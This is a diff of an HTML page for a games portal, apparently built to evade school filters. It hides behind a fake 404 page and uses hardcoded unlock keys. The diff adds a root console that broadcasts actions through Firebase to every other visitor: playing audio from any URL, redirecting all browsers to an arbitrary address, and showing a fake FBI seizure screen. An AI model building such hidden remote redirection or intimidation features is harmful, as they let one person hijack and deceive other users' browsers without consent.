@@ -8,79 +8,92 @@
         :root { --primary: #00ff41; --bg: #000500; --card: rgba(0, 20, 0, 0.9); --accent: #003b00; --panic: #ff3131; --pin: #ffcc00; --trending: #00ccff; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--bg); color: var(--primary); font-family: 'Courier New', monospace; overflow: hidden; }
 
-        /* CHAOS OVERLAYS */
-        #hackerOverlay { display: none; position: fixed; inset: 0; background: #000; z-index: 10001; color: #0f0; padding: 20px; font-size: 14px; overflow: hidden; white-space: pre-wrap; }
-        #seizedOverlay { display: none; position: fixed; inset: 0; background: #000; z-index: 10002; flex-direction: column; align-items: center; justify-content: center; text-align: center; color: white; }
+        /* CHAOS & OVERLAYS */
+        #hackerOverlay { display: none; position: fixed; inset: 0; background: #000; z-index: 10001; color: #0f0; padding: 20px; font-size: 14px; overflow-y: hidden; }
+        #seizedOverlay { display: none; position: fixed; inset: 0; background: #000; z-index: 10002; flex-direction: column; align-items: center; justify-content: center; color: white; }
         .ghost-active { cursor: none !important; }
         #fakeCursor { display: none; position: fixed; width: 20px; height: 20px; pointer-events: none; z-index: 30000; }
 
-        /* LAYOUT */
+        /* UI COMPONENTS */
         #lockdownScreen { position: fixed; inset: 0; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: black; }
         #bypassModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; border: 3px solid #000; padding: 30px; z-index: 10000; color: black; }
         #mainApp { display: none; height: 100vh; flex-direction: column; }
-        
         .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 30px; background: rgba(0,0,0,0.95); border-bottom: 1px solid var(--primary); }
         .grid-container { flex-grow: 1; overflow-y: auto; padding-bottom: 80px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; padding: 20px 30px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; padding: 15px 30px; }
         
-        .game-card { background: var(--card); border: 1px solid var(--accent); border-radius: 10px; padding: 15px; text-align: center; cursor: pointer; transition: 0.2s; height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .game-card:hover { border-color: var(--primary); transform: translateY(-2px); }
+        .game-card { background: var(--card); border: 1px solid var(--accent); border-radius: 10px; padding: 15px; text-align: center; cursor: pointer; height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
+        .fav-btn { position: absolute; top: 8px; left: 8px; background: none; border: none; color: #444; cursor: pointer; font-size: 18px; }
+        .fav-btn.active { color: var(--pin); }
 
+        /* SETTINGS PANEL */
         #settingsPanel { position: fixed; top: 0; right: -400px; width: 380px; height: 100vh; background: rgba(0, 5, 0, 0.98); border-left: 2px solid var(--primary); z-index: 2000; transition: 0.4s; padding: 25px; box-sizing: border-box; overflow-y: auto; }
         #settingsPanel.open { right: 0; }
-        .input-box { background: #000; border: 1px solid var(--primary); color: var(--primary); padding: 12px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-family: inherit; outline: none; }
+        .input-box { background: #000; border: 1px solid var(--primary); color: var(--primary); padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-family: inherit; }
+        .chaos-header { font-size: 10px; color: #888; margin-top: 15px; border-bottom: 1px solid #222; padding-bottom: 5px; }
     </style>
 </head>
 <body id="bodyRoot">
 
-    <img id="fakeCursor" src="https://cur.cursors-4u.net/arrows/arr-2/arr112.png" alt="cursor">
+    <audio id="globalAudio" loop></audio>
+    <img id="fakeCursor" src="https://cur.cursors-4u.net/arrows/arr-2/arr112.png">
+    
     <div id="hackerOverlay"></div>
     <div id="seizedOverlay">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Seal_of_the_Federal_Bureau_of_Investigation.svg/1200px-Seal_of_the_Federal_Bureau_of_Investigation.svg.png" width="150">
         <h1 style="color:red;">DOMAIN SEIZED</h1>
     </div>
 
-    <div id="lockdownScreen"><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>
+    <div id="lockdownScreen"><h1>404 Not Found</h1></div>
 
     <div id="bypassModal">
-        <h2>ENTER_SYSTEM_KEY</h2>
+        <h2>SYSTEM_KEY_REQUIRED</h2>
         <input type="password" id="sysKey" class="input-box" style="background:#eee; color:#000;">
-        <button onclick="checkBypass()" class="input-box" style="background:#000; color:#fff;">UNLOCK</button>
+        <button onclick="checkBypass()" class="input-box" style="background:#000; color:#fff;">UNBOLT</button>
     </div>
 
     <div id="mainApp">
         <div id="authLayer" style="position:fixed; inset:0; background:#000; z-index:5000; display:flex; align-items:center; justify-content:center;">
              <div style="width:320px; padding:40px; border:1px solid var(--primary); text-align:center;">
-                <h1 style="letter-spacing:5px;">MONGLE_OS</h1>
+                <h1>MONGLE_OS</h1>
                 <input type="text" id="username" class="input-box" placeholder="USERNAME">
                 <button class="input-box" onclick="handleLogin('pleb')">LOGIN</button>
-                <button class="input-box" style="font-size:10px;" onclick="promptLogin('root')">ROOT_CONSOLE</button>
+                <button class="input-box" style="font-size:10px;" onclick="promptLogin('root')">ROOT_ACCESS</button>
             </div>
         </div>
 
         <div id="arcade" style="height:100%; display:none; flex-direction:column;">
             <div class="top-bar">
-                <div id="userTag" style="color:var(--pin); font-weight:bold;">USER: GUEST</div>
-                <div style="display:flex; gap:10px;">
-                    <button id="settingsBtn" class="input-box" style="display:none; width:auto; margin:0;" onclick="toggleSettings()">⚙️</button>
-                    <button class="input-box" style="background:var(--panic); color:white; border:none; width:auto; margin:0;" onclick="location.replace('https://classroom.google.com')">PANIC</button>
-                </div>
+                <div id="userTag" style="color:var(--pin);">USER: GUEST</div>
+                <button id="settingsBtn" class="input-box" style="display:none; width:auto; margin:0;" onclick="toggleSettings()">⚙️</button>
             </div>
             <div class="grid-container">
+                <div id="favHeader" style="display:none; padding:20px 30px 0 30px; color:var(--pin);">⭐ FAVORITES</div>
+                <div class="grid" id="favGrid"></div>
+                <div style="padding:20px 30px 0 30px; opacity:0.5;">📂 LIBRARY</div>
                 <div class="grid" id="gameGrid"></div>
             </div>
         </div>
 
         <div id="settingsPanel">
-            <h2 style="color:red;">ROOT_CONSOLE</h2>
-            <input type="text" id="ttsInput" class="input-box" placeholder="TTS Message...">
-            <button class="input-box" style="background:cyan; color:black;" onclick="deployTTS()">VOICE_OF_GOD</button>
-            <hr border="1" color="#222">
-            <button class="input-box" onclick="triggerChaos('ghost')">👻 POLTERGEIST</button>
-            <button class="input-box" onclick="triggerChaos('hacker')">💻 HACKER_TYPER</button>
-            <button class="input-box" onclick="triggerChaos('seized')">👮 FBI_SEIZURE</button>
-            <button class="input-box" style="color:red;" onclick="triggerChaos('reset')">TERMINATE ALL CHAOS</button>
-            <button class="input-box" onclick="toggleSettings()">CLOSE</button>
+            <h2 style="color:red; margin:0;">MONGLE_ROOT</h2>
+            <p style="font-size:10px; color:#555;">PRANK_SYNC: ACTIVE</p>
+            
+            <div class="chaos-header">🔊 SONIC_DOMINANCE</div>
+            <input type="text" id="audioUrl" class="input-box" placeholder="Direct MP3 Link...">
+            <button class="input-box" style="background:#003b00;" onclick="deployAudio()">PLAY FOR ALL</button>
+            <button class="input-box" style="background:#3b0000;" onclick="stopAudio()">STOP AUDIO</button>
+
+            <div class="chaos-header">🔗 HIJACK_URL</div>
+            <input type="text" id="hijackUrl" class="input-box" placeholder="https://...">
+            <button class="input-box" onclick="deployHijack()">RE-ROUTE ALL</button>
+
+            <div class="chaos-header">💀 CHAOS_LIST</div>
+            <button class="input-box" onclick="triggerChaos('ghost')">GHOST_CURSOR</button>
+            <button class="input-box" onclick="triggerChaos('seized')">FBI_SEIZURE</button>
+            <button class="input-box" style="color:red;" onclick="triggerChaos('reset')">TERMINATE_ALL</button>
+            
+            <button class="input-box" style="margin-top:20px;" onclick="toggleSettings()">CLOSE_CONSOLE</button>
         </div>
     </div>
 
@@ -92,69 +105,76 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        let isRoot = false;
+        let isRoot = false, allGames = [], favorites = JSON.parse(localStorage.getItem('m_favs') || "[]");
 
         window.checkBypass = () => {
             if(document.getElementById('sysKey').value === "mongle77") {
                 document.getElementById('lockdownScreen').style.display = 'none';
                 document.getElementById('bypassModal').style.display = 'none';
                 document.getElementById('mainApp').style.display = 'block';
-            } else { alert("ACCESS DENIED"); }
+            }
         };
 
         window.handleLogin = (role) => {
-            if (role === 'root') { 
-                isRoot = true; 
-                document.getElementById('settingsBtn').style.display = 'block'; 
-                document.getElementById('userTag').innerText = "USER: MONGLE";
-            } else {
-                document.getElementById('userTag').innerText = "USER: " + (document.getElementById('username').value || "GUEST");
-            }
-            document.getElementById('authLayer').style.display = 'none';
-            document.getElementById('arcade').style.display = 'flex';
-            loadGames();
-            syncChaos();
+            if (role === 'root') { isRoot = true; document.getElementById('settingsBtn').style.display='block'; document.getElementById('userTag').innerText="USER: MONGLE"; }
+            else { document.getElementById('userTag').innerText="USER: " + (document.getElementById('username').value || "GUEST").toUpperCase(); }
+            document.getElementById('authLayer').style.display='none';
+            document.getElementById('arcade').style.display='flex';
+            loadGames(); syncChaos();
         };
 
-        window.promptLogin = (role) => { if (prompt("Master Key:") === "MONGLE_OWNER_99") handleLogin('root'); };
+        window.promptLogin = (role) => { if(prompt("Key:") === "MONGLE_OWNER_99") handleLogin('root'); };
 
         async function loadGames() {
             const res = await fetch(`https://api.github.com/repos/bob154526-hue/Mongle/contents/`);
-            const files = (await res.json()).filter(i => i.name.endsWith('.html') && i.name !== 'index.html');
-            const grid = document.getElementById('gameGrid'); grid.innerHTML = "";
-            files.forEach(game => {
-                const div = document.createElement('div');
-                div.className = 'game-card';
-                div.innerHTML = `<div style="font-size:12px;">${game.name.replace('.html','')}</div>`;
-                div.onclick = () => window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${game.name}`, '_blank');
-                grid.appendChild(div);
-            });
+            allGames = (await res.json()).filter(i => i.name.endsWith('.html') && i.name !== 'index.html');
+            render();
         }
 
-        window.triggerChaos = (type) => set(ref(db, 'global/chaos'), {type: type, time: Date.now()});
-        window.deployTTS = () => set(ref(db, 'global/tts'), { text: document.getElementById('ttsInput').value, time: Date.now() });
+        window.render = () => {
+            const lib = document.getElementById('gameGrid');
+            const fav = document.getElementById('favGrid');
+            lib.innerHTML = fav.innerHTML = "";
+            document.getElementById('favHeader').style.display = favorites.length ? 'block' : 'none';
+
+            allGames.forEach(g => {
+                const isF = favorites.includes(g.name);
+                const card = document.createElement('div');
+                card.className = 'game-card';
+                card.innerHTML = `<button class="fav-btn ${isF?'active':''}" onclick="event.stopPropagation(); toggleFav('${g.name}')">★</button><div>${g.name.replace('.html','')}</div>`;
+                card.onclick = () => window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${g.name}`, '_blank');
+                if(isF) fav.appendChild(card.cloneNode(true)).onclick = card.onclick;
+                lib.appendChild(card);
+            });
+        };
+
+        window.toggleFav = (n) => {
+            favorites = favorites.includes(n) ? favorites.filter(f => f!==n) : [...favorites, n];
+            localStorage.setItem('m_favs', JSON.stringify(favorites));
+            render();
+        };
+
+        window.deployAudio = () => set(ref(db, 'global/audio'), { url: document.getElementById('audioUrl').value, playing: true });
+        window.stopAudio = () => set(ref(db, 'global/audio'), { playing: false });
+        window.deployHijack = () => set(ref(db, 'global/hijack'), { url: document.getElementById('hijackUrl').value, time: Date.now() });
+        window.triggerChaos = (t) => set(ref(db, 'global/chaos'), { type: t, time: Date.now() });
 
         function syncChaos() {
-            onValue(ref(db, 'global/tts'), (s) => {
+            onValue(ref(db, 'global/audio'), (s) => {
                 const d = s.val();
-                if (d && !isRoot) { // PRANKS IGNORE ROOT
-                    window.speechSynthesis.speak(new SpeechSynthesisUtterance(d.text));
-                }
+                const player = document.getElementById('globalAudio');
+                if(d && d.playing && !isRoot) { player.src = d.url; player.play(); } else { player.pause(); }
             });
-
+            onValue(ref(db, 'global/hijack'), (s) => { if(s.val() && !isRoot) window.location.href = s.val().url; });
             onValue(ref(db, 'global/chaos'), (s) => {
                 const d = s.val();
-                if (!d || isRoot) return; // PRANKS IGNORE ROOT
-                
-                document.getElementById('hackerOverlay').style.display = (d.type === 'hacker') ? 'block' : 'none';
+                if(!d || isRoot) return;
                 document.getElementById('seizedOverlay').style.display = (d.type === 'seized') ? 'flex' : 'none';
-                if(d.type === 'ghost') { document.body.classList.add('ghost-active'); document.getElementById('fakeCursor').style.display = 'block'; }
-                else { document.body.classList.remove('ghost-active'); document.getElementById('fakeCursor').style.display = 'none'; }
+                if(d.type === 'ghost') document.body.classList.add('ghost-active'); else document.body.classList.remove('ghost-active');
             });
         }
 
-        window.toggleSettings = () => document.getElementById('settingsPanel').classList.toggle('open');
-        document.addEventListener('keydown', (e) => { if (e.shiftKey && e.key === 'L') document.getElementById('bypassModal').style.display = 'block'; });
+        document.addEventListener('keydown', (e) => { if(e.shiftKey && e.key === 'L') document.getElementById('bypassModal').style.display='block'; });
     </script>
 </body>
 </html>
